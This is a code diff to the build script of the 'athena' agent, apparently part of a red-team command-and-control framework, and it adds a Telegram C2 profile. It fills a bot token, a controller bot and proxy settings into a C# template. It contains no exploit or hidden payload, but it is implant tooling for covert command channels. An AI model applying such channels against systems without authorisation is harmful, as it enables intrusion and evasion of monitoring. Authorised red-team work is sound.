@@ -145,7 +145,7 @@ class athena(PayloadType):
         #     description="Hide the window when running the payload"
         # ),
     ]
-    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github", "zoom"]
+    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github", "zoom", "telegram"]
 
     async def prepareWinExe(self, output_path):
         pe = pefile.PE(os.path.join(output_path, "{}.exe".format(self.get_parameter("assemblyname"))))
@@ -184,6 +184,36 @@ class athena(PayloadType):
         with open("{}/Agent.Profiles.Discord/DiscordProfile.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
         self.addProfile(agent_build_path, "Discord")
+
+    async def buildTelegram(self, agent_build_path, c2):
+        baseConfigFile = open("{}/Agent.Profiles.Telegram/Base.txt".format(agent_build_path.name), "r").read()
+        parameters = c2.get_parameters_dict()
+
+        def value(name, default=""):
+            selected = parameters.get(name, default)
+            return str(selected) if selected is not None and selected != "" else default
+
+        def csharp_string(selected):
+            return selected.replace("\\", "\\\\").replace('"', '\\"').replace("\r", "\\r").replace("\n", "\\n")
+
+        replacements = {
+            "%TG_BOT_TOKEN%": value("bot_token"),
+            "%TG_CONTROLLER_BOT%": value("controller_bot"),
+            "%TG_API_BASE%": value("api_base", "https://api.telegram.org"),
+            "%TG_USER_AGENT%": value("user_agent", "Mozilla/5.0"),
+            "%TG_PROXY_HOST%": value("proxy_host"),
+            "%TG_PROXY_PORT%": value("proxy_port"),
+            "%TG_PROXY_USER%": value("proxy_user"),
+            "%TG_PROXY_PASS%": value("proxy_pass"),
+            "%TG_MESSAGE_CHECKS%": value("message_checks", "10"),
+            "%TG_TIME_BETWEEN_CHECKS%": value("time_between_checks", "10"),
+        }
+        for placeholder, selected in replacements.items():
+            baseConfigFile = baseConfigFile.replace(placeholder, csharp_string(selected))
+
+        with open("{}/Agent.Profiles.Telegram/TelegramProfile.cs".format(agent_build_path.name), "w") as f:
+            f.write(baseConfigFile)
+        self.addProfile(agent_build_path, "Telegram")
 
     async def buildGitHub(self, agent_build_path, c2):
         baseConfigFile = open("{}/Agent.Profiles.GitHub/Base.txt".format(agent_build_path.name), "r").read()
@@ -455,6 +485,9 @@ class athena(PayloadType):
                 elif profile["name"] == "zoom":
                     roots_replace += "<assembly fullname=\"Agent.Profiles.Zoom\"/>" + '\n'
                     await self.buildZoom(agent_build_path, c2)
+                elif profile["name"] == "telegram":
+                    roots_replace += "<assembly fullname=\"Agent.Profiles.Telegram\"/>" + '\n'
+                    await self.buildTelegram(agent_build_path, c2)
                 else:
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(profile["name"]))
             
